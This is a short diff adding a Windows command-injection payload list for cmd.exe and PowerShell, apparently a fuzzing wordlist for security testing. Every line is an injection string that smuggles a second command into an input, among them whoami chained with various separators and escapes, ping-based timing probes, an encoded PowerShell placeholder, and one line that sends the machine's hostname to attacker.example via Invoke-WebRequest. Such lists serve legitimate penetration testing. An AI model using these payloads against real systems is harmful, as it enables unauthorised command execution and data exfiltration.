@@ -1,0 +1,16 @@
+# command-injection/windows — cmd.exe + powershell separators
+& whoami
+&& whoami
+| whoami
+|| whoami
+%0a whoami
+%0d%0a whoami
+" & whoami & "
+"%26 whoami %26"
+;timeout 5
+& ping -n 5 127.0.0.1
+| ping -n 5 127.0.0.1
+& powershell -enc <BASE64_PAYLOAD>
+& powershell -c "Invoke-WebRequest http://attacker.example/$(hostname)"
+^& whoami
+^| whoami
